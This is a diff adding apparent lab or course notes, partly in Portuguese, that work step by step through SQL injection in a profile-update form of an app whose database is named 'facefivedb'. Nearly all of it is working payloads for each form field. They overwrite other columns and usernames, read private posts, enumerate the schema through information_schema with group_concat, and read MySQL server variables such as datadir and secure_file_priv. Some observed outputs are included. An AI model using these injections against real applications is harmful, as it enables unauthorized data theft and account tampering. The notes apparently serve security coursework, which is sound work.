@@ -1,0 +1,171 @@
+Payload (
+    name
+    currentpassword
+    newpassword
+    about
+    photo
+)
+
+
+Update profile query (maybe)
+UPDATE Users set password='<?>', name='<?>', about=<?>, password = ''  WHERE username = '<username>' and password=<password>;
+
+Podemos injetar SQL a partir do novo
+    name
+        name: asdf', about='name_about' where username='asdf'# -> muda o about
+
+    about
+        about: about', name='ASDF' where username='asdf'# -> muda o name
+
+    new_password
+        new_passowrd: fdsa', about='ABOUT' where username='asdf'# -> muda o about
+
+    photo_file_name
+        filename: img', about='img_about' where username='asdf'# -> muda o about
+
+Conseguimos ainda fazer o SQLi sem usar comentarios:
+    name: "newname', about='about_text" -> will change about and places the query in a correct state
+
+We can even change the username (if we don't violate the primary key constraint)
+        name: new name', username='ASDF' where username='asdf'#
+(reset) name: ', username='asdf' where username='ASDF'#
+
+We can also inject a new query inside a parameter
+    NAME', about=(SELECT type from Posts where author='asdf') where username = 'asdf'#
+
+We can check the database version:
+    ', about=(VERSION()) where username = 'asdf'#
+
+As it was proven above, we can make this injection in any of the above fields. Using name
+Beforehand: Insert a post with content <post_content>
+    NAME', about=(SELECT content from Posts where author='asdf') where username = 'asdf'#
+        This will change the about info to <post_content>
+
+
+    NAME', about=(SELECT username from Users where username='asdf') where username = 'asdf'#
+
+    NAME', about=(SELECT author from Posts where content='POST CONTENT') where username = 'asdf'#
+        About now has our username
+
+This also works
+    NAME', about=(SELECT content from Posts where author='ssofadmin' LIMIT 1) where username = 'asdf'#
+
+We can check private posts
+    NAME', about=(SELECT content from Posts where author='investor' AND type='PRIVATE' LIMIT 1) where username = 'asdf'#
+
+
+We can try to assess the database schema
+    NAME', about=(SELECT table_name from information_schema.tables LIMIT 1) where username = 'asdf'#
+    It gives us a weird table... we just want our database's table
+    Since we got the database name from another error, we can write the query:
+    NAME', about=(SELECT table_name from information_schema.tables WHERE table_schema='facefivedb' LIMIT 1) where username = 'asdf'#
+    > It gives us a table from the database!
+
+But we also want more than one row... We can concatenate them!
+
+', about=(
+    SELECT tables
+    FROM (
+        SELECT "" as g, group_concat(table_name) as tables
+        FROM (
+            SELECT table_name
+            FROM information_schema.tables
+            WHERE table_schema = 'facefivedb'
+        ) AS T2
+        GROUP BY g
+    ) AS T1
+) WHERE username = 'asdf'#
+    > Now we got the database schema!!
+
+
+Now we want every table's schema!
+', about=(
+    SELECT cols
+    FROM (
+        SELECT "" as g, group_concat(column_name) as cols
+        FROM (
+            SELECT column_name
+            FROM information_schema.columns
+            WHERE table_schema = 'facefivedb'
+            AND table_name = '<table_name>'
+        ) AS T2
+        GROUP BY g
+    ) AS T1
+) WHERE username = 'asdf'#
+
+
+We may also want to get the table constraints
+', about=(
+    SELECT cols
+    FROM (
+        SELECT "" as g, group_concat(constraints) as cols
+        FROM (
+            SELECT constraints
+            FROM information_schema.table_constraints t
+            JOIN information_schema.key_column_usage k
+            USING(constraint_name,table_schema,table_name)
+            WHERE t.table_schema = 'facefivedb'
+            AND t.table_name = 'Users'
+            AND t.constraint_type='PRIMARY KEY'
+        ) AS T2
+        GROUP BY g
+    ) AS T1
+) WHERE username = 'asdf'#
+
+
+', about=(
+    SELECT constraints
+    FROM (
+        SELECT "" as g, group_concat(constraint_name) as constraints
+        FROM (
+            SELECT constraint_name
+            FROM information_schema.table_constraints t
+            JOIN information_schema.key_column_usage k
+            USING(constraint_name,table_schema,table_name)
+            WHERE t.table_schema = 'facefivedb'
+            AND t.table_name = 'Users'
+            AND t.constraint_type='PRIMARY KEY'
+        ) AS T2
+        GROUP BY g
+    ) AS T1
+) WHERE username = 'asdf'#
+
+
+', about=(
+    SELECT constraints
+    FROM (
+        SELECT "" as g, group_concat(c) as constraints
+        FROM (
+            SELECT CONCAT_WS('->', column_name, constraint_name) as c
+            FROM information_schema.table_constraints t
+            JOIN information_schema.key_column_usage k
+            USING(constraint_name,table_schema,table_name)
+            WHERE t.table_schema = 'facefivedb'
+            AND t.table_name = 'Users'
+        ) AS T2
+        GROUP BY g
+    ) AS T1
+) WHERE username = 'asdf'#
+
+
+What if we want to write in an arbitrary place in the database??
+(TODO)
+
+
+
+We can get also database variables!
+' , about=(SELECT @@GLOBAL.basedir) where username='asdf'#
+ -> /usr/
+
+' , about=(SELECT @@GLOBAL.version_compile_os) where username='asdf'#
+ -> Linux
+
+' , about=(SELECT @@datadir) where username='asdf'#
+ -> /var/lib/mysql/
+
+', about=(SELECT @@GLOBAL.secure_file_priv) where username='asdf'#
+ /var/lib/mysql-files/
+
+
+Got error:
+(1045, "Access denied for user 'facefive'@'%' (using password: YES)")
